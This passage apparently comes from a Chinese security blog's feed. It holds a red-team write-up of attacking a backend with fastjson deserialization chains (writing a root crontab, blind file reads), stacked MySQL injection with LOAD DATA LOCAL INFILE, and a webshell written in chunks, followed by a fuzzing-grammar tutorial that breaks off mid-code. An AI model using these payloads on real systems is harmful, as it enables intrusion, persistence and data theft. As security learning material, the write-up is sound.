    <published>2022-08-24T10:38:45.000Z</published>
    <updated>2023-04-12T02:36:51.335Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一次攻防小记"><a href="#一次攻防小记" class="headerlink" title="一次攻防小记"></a>一次攻防小记</h1><p>​  一次攻防，第一天师傅rmi直接进了总公司内网，笔者在核心资产段打了好久没能进去，水了几天边缘分公司，队长又让打核心段，看看之前的一些弱口令，后台能不能后续利用，没办法硬着头皮打。<br>​  这个弱口令属于那种爆破可以爆破出的，但是随手试肯定不会试的，后台功能点比较多，但是生产也不敢乱动，之前师傅进后台挖过，找到了个跨目录上传和文件读取（都仅限jpg后缀），笔者经过细挖，找到个sql注入（mysql，支持堆叠，mysql用户权限较低）和fastjson（1.2.47&lt;版本&lt;1.2.68)，fatjson利用点只有两种响应，成功和失败，中间间是tomcat，不出网，然后开始尝试getshell。</p><h2 id="fastjson利用"><a href="#fastjson利用" class="headerlink" title="fastjson利用"></a>fastjson利用</h2><p>随手一试fastjson jdk8 写文件的链</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span> <span class="token property">"x"</span><span class="token operator">:</span><span class="token punctuation">{</span>        <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>         <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"sun.rmi.server.MarshalOutputStream"</span><span class="token punctuation">,</span>        <span class="token property">"out"</span><span class="token operator">:</span><span class="token punctuation">{</span>            <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.util.zip.InflaterOutputStream"</span><span class="token punctuation">,</span>            <span class="token property">"out"</span><span class="token operator">:</span><span class="token punctuation">{</span>                <span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"java.io.FileOutputStream"</span><span class="token punctuation">,</span>                <span class="token property">"file"</span><span class="token operator">:</span><span class="token string">"/var/spool/cron/crontabs/root"</span><span class="token punctuation">,</span>                <span class="token property">"append"</span><span class="token operator">:</span><span class="token boolean">false</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token property">"infl"</span><span class="token operator">:</span><span class="token punctuation">{</span>                <span class="token property">"input"</span><span class="token operator">:</span><span class="token string">"eJzTUtCCwswUBTsF_ZLcAv2U1OJivayCdABYLgeL"</span>            <span class="token punctuation">}</span><span class="token punctuation">,</span>            <span class="token property">"bufLen"</span><span class="token operator">:</span><span class="token number">1048576</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span>        <span class="token property">"protocolVersion"</span><span class="token operator">:</span><span class="token number">1</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>压缩数据生成</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token punctuation">,</span> base64_encode<span class="token keyword">import</span> zlibcc<span class="token operator">=</span><span class="token string">'hello'</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>ccc<span class="token operator">=</span>zlib<span class="token punctuation">.</span>compress<span class="token punctuation">(</span>cc<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>base64_encode<span class="token punctuation">(</span>ccc<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>居然成功了，写个jpg，用上面的文件读取也能读到写入的文件，当时就感觉有机会，但是苦于没有路径，然后试commons-io 发现存在依赖，尝试读文件的链子</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"abc"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.commons.io.input.BOMInputStream"</span><span class="token punctuation">,</span>    <span class="token property">"delegate"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.commons.io.input.ReaderInputStream"</span><span class="token punctuation">,</span>      <span class="token property">"reader"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"jdk.nashorn.api.scripting.URLReader"</span><span class="token punctuation">,</span>        <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"file:///tmp/"</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token property">"charsetName"</span><span class="token operator">:</span> <span class="token string">"UTF-8"</span><span class="token punctuation">,</span>      <span class="token property">"bufferSize"</span><span class="token operator">:</span> <span class="token number">1024</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"boms"</span><span class="token operator">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.commons.io.ByteOrderMark"</span><span class="token punctuation">,</span>        <span class="token property">"charsetName"</span><span class="token operator">:</span> <span class="token string">"UTF-8"</span><span class="token punctuation">,</span>        <span class="token property">"bytes"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          ...        <span class="token punctuation">]</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"address"</span> <span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.abc.BOM"</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是没有回显，无法判断，随后拜读浅蓝师傅的文章 <a href="https://b1ue.cn/archives/506.html">https://b1ue.cn/archives/506.html</a></p><p>前面读文件的链子bytes和读的文件匹配，getBOM会返回这个bytes，然后下面利用类型不匹配，让fastjson报错，服务器返回“错误”，来实现盲注读文件</p><p>通过读/root/.bash_history等拿到tomcat路径</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">{</span>  <span class="token property">"abc"</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span>    <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.commons.io.input.BOMInputStream"</span><span class="token punctuation">,</span>    <span class="token property">"delegate"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.commons.io.input.ReaderInputStream"</span><span class="token punctuation">,</span>      <span class="token property">"reader"</span><span class="token operator">:</span> <span class="token punctuation">{</span> <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"jdk.nashorn.api.scripting.URLReader"</span><span class="token punctuation">,</span>        <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"file:///tmp/test"</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token property">"charsetName"</span><span class="token operator">:</span> <span class="token string">"UTF-8"</span><span class="token punctuation">,</span>      <span class="token property">"bufferSize"</span><span class="token operator">:</span> <span class="token number">1024</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"boms"</span><span class="token operator">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        <span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"org.apache.commons.io.ByteOrderMark"</span><span class="token punctuation">,</span>        <span class="token property">"charsetName"</span><span class="token operator">:</span> <span class="token string">"UTF-8"</span><span class="token punctuation">,</span>        <span class="token property">"bytes"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token number">98</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token property">"address"</span> <span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.AutoCloseable"</span><span class="token punctuation">,</span><span class="token property">"@type"</span><span class="token operator">:</span><span class="token string">"org.apache.commons.io.input.CharSequenceReader"</span><span class="token punctuation">,</span><span class="token property">"charSequence"</span><span class="token operator">:</span> <span class="token punctuation">{</span><span class="token property">"@type"</span><span class="token operator">:</span> <span class="token string">"java.lang.String"</span><span class="token punctuation">{</span><span class="token property">"$ref"</span><span class="token operator">:</span><span class="token string">"$.abc.BOM[0]"</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"start"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token property">"end"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>但是很可惜，实战环境有点复杂，经过小修改之后链子只能用来探测路径或文件是否存在，无论如何类型匹配那都不报错，笔者尝试不读文件进行对比，直接返回byte，实战环境也不报错，只能fuzz一下tomcat路径，也没fuzz出来，gg。</p><h2 id="写计划任务"><a href="#写计划任务" class="headerlink" title="写计划任务"></a>写计划任务</h2><p>试了一下写计划任务，/var/spool/cron/root写不进去，很奇怪（后来发现是队长开始写了一次，写进去了，但是语法有问题，文件不知道为啥被锁了，后来就写不进去了，覆盖追加都不行），尝试其他用户常见用户名也都失败，用mysql读了一下安装路径，发现是/home/soft ,写/var/spool/cron/soft ，也没执行，窒息.jpg。</p><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>fastjson没啥看了，去深入一下注入，发现可以堆叠，在secure-file-priv=NULL时，可以尝试下面这种方法读文件 ,很全的一篇mysql注入文章 <a href="https://xz.aliyun.com/t/7169#toc-32">https://xz.aliyun.com/t/7169#toc-32</a></p><pre class="line-numbers language-SQL" data-language="SQL"><code class="language-SQL">drop table mysql.m1;CREATE TABLE mysql.m1 (code TEXT );LOAD DATA LOCAL INFILE 'D://1.txt' INTO TABLE mysql.m1 fields terminated by '';select * from mysql.m1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>可惜还是不行，后来才知道在local_infile变量开启时候这种方法才可以读到文件，另外这站还是站库分离，mysql在阿里云上，当时竟然没测一下，浪费了不少时间，还是菜，当然这都是后话，泪.jpg。<br>到现在没得其他思路了，而且这个站已经搞了好几天了，也没搞下来，太菜了呜呜呜。</p><h2 id="二战"><a href="#二战" class="headerlink" title="二战"></a>二战</h2><p>过了两天又来日这个站，另一个师傅扫了一下目录，发现个nginx的配置文件，配置文件可以看出这个站的后台接口是被代理到另一个内网服务器，配置文件里还发现个转发服务器地址，它刚好有个druid，刚好是个弱口令，主页看到classpath，/root/soft/apache-tomcatxxxxxx（xxxxx为版本号） ,刚好这个站也有个soft用户，回去一试，/home/soft/apache-tomcatxxxxx路径存在！！！！！！！！！！！！！<br>随后就是写shell了，不知道为啥完整的shell压缩之后用fastjson写进去会报错，把shell分成几部分追加写，写文件链子里的append false改为true。<br>附一个笔者常用的在没有waf的情况下检测fastjosn的小技巧，json数据里，加上 </p><pre><code class="json">"@type":"xxxx"</code></pre><p>一般是fatjson就会报错，这次这个站就是这么发现的，后台接口很多，但是只有这一个地方的一个参数传的是json数据,也不出网。<br>小总结一下吧，端口要扫全，弱口令都要试一下，能爆破就爆破，目录该扫也要扫，毕竟渗透本质是信息收集。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一次攻防小记&quot;&gt;&lt;a href=&quot;#一次攻防小记&quot; class=&quot;headerlink&quot; title=&quot;一次攻防小记&quot;&gt;&lt;/a&gt;一次攻防小记&lt;/h1&gt;&lt;p&gt;​  一次攻防，第一天师傅rmi直接进了总公司内网，笔者在核心资产段打了好久没能进去，水了几天边缘分公司，队</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="渗透测试" scheme="https://rainsec.cn/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>Fuzzing之Grammars</title>
    <link href="https://rainsec.cn/post/Fuzzing%E4%B9%8BGrammers.html"/>
    <id>https://rainsec.cn/post/Fuzzing%E4%B9%8BGrammers.html</id>
    <published>2022-07-31T08:42:45.000Z</published>
    <updated>2023-04-12T02:36:51.355Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Fuzzing之Grammars"><a href="#Fuzzing之Grammars" class="headerlink" title="Fuzzing之Grammars"></a>Fuzzing之Grammars</h1><h2 id="Fuzzing-input"><a href="#Fuzzing-input" class="headerlink" title="Fuzzing input"></a>Fuzzing input</h2><p>​  Fuzzing的一大核心思想其实就是通过大量的Input去触发程序的各个分支逻辑，因此Fuzzing的成功与否和Input的生成关系密切。Input的格式多种多样，可以是文件，代码，json数据等等。但是各种各样的数据都有自己的格式，程序的输入也是如此，那么在生成Input的过程中，格式化非常关键，程序无法接受的输入对于Fuzzing来说是毫无意义的。</p><p>​  为了很好的描述一个程序的输入，一个很有必要的事情是为输入制定一些语法规范。比如编译器的输入：python解释器规定了符合python语法的程序才能得以执行，gcc规定了符合C语言语法的程序才能被完成编译进而生成二进制文件。Fuzzing也是如此，为了很好的达到Fuzzing的效果，为程序定义一种输入的语法规范往往是一种不错的选择。</p><p>​  一般而言，对于Fuzzing简单的程序来说，正则表达式往往是一个不错的选择，它所具备的有限状态机属性使得它易于推理进而获得一个满意的Input。但是如果面临的Fuzzing目标需要非常复杂的输入，那么它就会表现的捉襟见肘。</p><p>​  我曾见过为了更好的实现某些功能而专门设计一些语言，从计算机理论的角度这显然是非常有用的，一些特殊功能在特殊语言的加持之下表现出超高的质量，但是对于Fuzzing而言这确实是成本过高了，Grammars其实就是正则表达式和专业语言之间的一个中间地带。它易于理解，并且能很好的完成Fuzzing对它的期望–生成大量合法输入，因为通过Grammars可以规定Inputs的大量属性，完美的表达一个复杂输入的语法结构。</p><h2 id="Grammars初探"><a href="#Grammars初探" class="headerlink" title="Grammars初探"></a>Grammars初探</h2><p>​  Grammar一般由符号和一组表达式组成，例如<code>A = 10 | 9 | 0 |1</code>，符号化使得递归成为可能，假设<code>B = A | AB</code>，这无疑就使得符号所代表的范围倍增。根据这种思想我们可以制作一个算数表达式：</p><pre class="line-numbers language-none"><code class="language-none">&lt;start&gt;   ::= &lt;expr&gt;&lt;expr&gt;    ::= &lt;term&gt; + &lt;expr&gt; | &lt;term&gt; - &lt;expr&gt; | &lt;term&gt;&lt;term&gt;    ::= &lt;term&gt; * &lt;factor&gt; | &lt;term&gt; / &lt;factor&gt; | &lt;factor&gt;&lt;factor&gt;  ::= +&lt;factor&gt; | -&lt;factor&gt; | (&lt;expr&gt;) | &lt;integer&gt; | &lt;integer&gt;.&lt;integer&gt;&lt;integer&gt; ::= &lt;digit&gt;&lt;integer&gt; | &lt;digit&gt;&lt;digit&gt;   ::= 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 | 8 | 9<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么通过对<code>&lt;start&gt;</code>的内部的符号进行逐一扩展，并对过程进行随机化处理，最终就可以得到大量的合法算数表达式。和大多数语法一样，Grammar也应该有自己的Type，以便对其合法性进行校验，以Python 为例子可以对上述的Grammar进行定义：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">Option <span class="token operator">=</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Any<span class="token punctuation">]</span>Expansion <span class="token operator">=</span> Union<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Tuple<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> Option<span class="token punctuation">]</span><span class="token punctuation">]</span>Grammar <span class="token operator">=</span> Dict<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> List<span class="token punctuation">[</span>Expansion<span class="token punctuation">]</span><span class="token punctuation">]</span>EXPR_GRAMMAR<span class="token punctuation">:</span> Grammar <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"&lt;start&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;expr&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;expr&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;term&gt; + &lt;expr&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;term&gt; - &lt;expr&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;term&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;term&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;factor&gt; * &lt;term&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;factor&gt; / &lt;term&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;factor&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;factor&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"+&lt;factor&gt;"</span><span class="token punctuation">,</span>        <span class="token string">"-&lt;factor&gt;"</span><span class="token punctuation">,</span>        <span class="token string">"(&lt;expr&gt;)"</span><span class="token punctuation">,</span>        <span class="token string">"&lt;integer&gt;.&lt;integer&gt;"</span><span class="token punctuation">,</span>        <span class="token string">"&lt;integer&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;integer&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;digit&gt;&lt;integer&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;digit&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;digit&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>前三行代码定义了一个Grammar应该如何在Python中构成。通过代码中的<code>EXPR_GRAMMAR["&lt;digit&gt;"]</code>可以访问当前Grammar的各个组成部分并对其进行操作。</p><h3 id="Sample-Grammar-Fuzz"><a href="#Sample-Grammar-Fuzz" class="headerlink" title="Sample Grammar Fuzz"></a>Sample Grammar Fuzz</h3><p>​  那么该如何对Grammar语法进行解析呢？一种最简单的方式就是通过字符串替换，因为在Grammar中<code>:</code>的左右两侧本身就是一种映射关系，因此利用字符串替换不断迭代是一种最为直观的选择。</p><p>实例代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">START_SYMBOL <span class="token operator">=</span> <span class="token string">"&lt;start&gt;"</span><span class="token comment"># 一个简单的gramar fuzzer</span><span class="token keyword">def</span> <span class="token function">simple_grammar_fuzzer</span><span class="token punctuation">(</span>grammar<span class="token punctuation">:</span> Grammar<span class="token punctuation">,</span>                           start_symbol<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> START_SYMBOL<span class="token punctuation">,</span>                          max_nonterminals<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">,</span>                          max_expansion_trials<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">,</span>                          log<span class="token punctuation">:</span> <span class="token builtin">bool</span> <span class="token operator">=</span> <span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Produce a string from `grammar`.       `start_symbol`: use a start symbol other than `&lt;start&gt;` (default).       `max_nonterminals`: the maximum number of nonterminals          still left for expansion       `max_expansion_trials`: maximum # of attempts to produce a string       `log`: print expansion progress if True"""</span>    term <span class="token operator">=</span> start_symbol    expansion_trials <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nonterminals<span class="token punctuation">(</span>term<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">:</span> <span class="token comment"># 判断字符串中是否存在&lt;&gt;，并返回所有被&lt;&gt;包裹的项，注意如果是&lt;dsad&lt;abc&gt;&gt;则返回&lt;abc&gt;</span>        symbol_to_expand <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>nonterminals<span class="token punctuation">(</span>term<span class="token punctuation">)</span><span class="token punctuation">)</span>        expansions <span class="token operator">=</span> grammar<span class="token punctuation">[</span>symbol_to_expand<span class="token punctuation">]</span>        expansion <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>expansions<span class="token punctuation">)</span>        <span class="token comment"># In later chapters, we allow expansions to be tuples,</span>        <span class="token comment"># with the expansion being the first element</span>        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>expansion<span class="token punctuation">,</span> <span class="token builtin">tuple</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            expansion <span class="token operator">=</span> expansion<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        new_term <span class="token operator">=</span> term<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>symbol_to_expand<span class="token punctuation">,</span> expansion<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># 解析下一个符号</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nonterminals<span class="token punctuation">(</span>new_term<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> max_nonterminals<span class="token punctuation">:</span> <span class="token comment"># 每次的可解析符号，必须少于最大单次解析量</span>            term <span class="token operator">=</span> new_term            <span class="token keyword">if</span> log<span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"%-40s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>symbol_to_expand <span class="token operator">+</span> <span class="token string">" -&gt; "</span> <span class="token operator">+</span> expansion<span class="token punctuation">)</span><span class="token punctuation">,</span> term<span class="token punctuation">)</span>            expansion_trials <span class="token operator">=</span> <span class="token number">0</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            expansion_trials <span class="token operator">+=</span> <span class="token number">1</span>            <span class="token keyword">if</span> expansion_trials <span class="token operator">&gt;=</span> max_expansion_trials<span class="token punctuation">:</span> <span class="token comment"># 总的解析次数也存在限制</span>                <span class="token keyword">raise</span> ExpansionError<span class="token punctuation">(</span><span class="token string">"Cannot expand "</span> <span class="token operator">+</span> <span class="token builtin">repr</span><span class="token punctuation">(</span>term<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> term<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>利用上面的表达式Grammar可以制作一个简单的grammar fuzz，Fuzz的编写过程其实面临着很多的取舍，便利和速度或者各种各样的可行性之间的考虑，以上面的Grammar为例子，我们肯定不希望其陷入类似无限递归或者大量符号解析的情况，而是会限制对字段的提取次数和对符号的解析次数。</p><p>​  但是此类Grammar Fuzz都面临几个问题就是大量的字符串搜索和替换操作导致效率低下，而且可以看出存在Input生成失败的情况（ExpansionError），而且这是一个典型的上下文无关的Fuzz。不过，依赖于上述功能，我们只要编写Grammar就可以很好的对一些Inputs进行大量生成。</p><p>比如URL生成：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">URL_GRAMMAR<span class="token punctuation">:</span> Grammar <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">"&lt;start&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;url&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;url&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;scheme&gt;://&lt;authority&gt;&lt;path&gt;&lt;query&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;scheme&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"http"</span><span class="token punctuation">,</span> <span class="token string">"https"</span><span class="token punctuation">,</span> <span class="token string">"ftp"</span><span class="token punctuation">,</span> <span class="token string">"ftps"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;authority&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;host&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;host&gt;:&lt;port&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;userinfo&gt;@&lt;host&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;userinfo&gt;@&lt;host&gt;:&lt;port&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;host&gt;"</span><span class="token punctuation">:</span>  <span class="token comment"># 大部分情况下其实可以指定一个URL</span>        <span class="token punctuation">[</span><span class="token string">"cispa.saarland"</span><span class="token punctuation">,</span> <span class="token string">"www.google.com"</span><span class="token punctuation">,</span> <span class="token string">"fuzzingbook.com"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;port&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"80"</span><span class="token punctuation">,</span> <span class="token string">"8080"</span><span class="token punctuation">,</span> <span class="token string">"&lt;nat&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;nat&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;digit&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;digit&gt;&lt;digit&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;digit&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"0"</span><span class="token punctuation">,</span> <span class="token string">"1"</span><span class="token punctuation">,</span> <span class="token string">"2"</span><span class="token punctuation">,</span> <span class="token string">"3"</span><span class="token punctuation">,</span> <span class="token string">"4"</span><span class="token punctuation">,</span> <span class="token string">"5"</span><span class="token punctuation">,</span> <span class="token string">"6"</span><span class="token punctuation">,</span> <span class="token string">"7"</span><span class="token punctuation">,</span> <span class="token string">"8"</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;userinfo&gt;"</span><span class="token punctuation">:</span>  <span class="token comment"># Just one</span>        <span class="token punctuation">[</span><span class="token string">"user:password"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;path&gt;"</span><span class="token punctuation">:</span>  <span class="token comment"># Just a few</span>        <span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">"/&lt;id&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;id&gt;"</span><span class="token punctuation">:</span>  <span class="token comment"># Just a few</span>        <span class="token punctuation">[</span><span class="token string">"abc"</span><span class="token punctuation">,</span> <span class="token string">"def"</span><span class="token punctuation">,</span> <span class="token string">"x&lt;digit&gt;&lt;digit&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;query&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"?&lt;params&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;params&gt;"</span><span class="token punctuation">:</span>        <span class="token punctuation">[</span><span class="token string">"&lt;param&gt;"</span><span class="token punctuation">,</span> <span class="token string">"&lt;param&gt;&amp;&lt;params&gt;"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">"&lt;param&gt;"</span><span class="token punctuation">:</span>  <span class="token comment"># Just a few</span>        <span class="token punctuation">[</span><span class="token string">"&lt;id&gt;=&lt;id&gt;"</span><span class="token punctuation">,</span> <span class="token 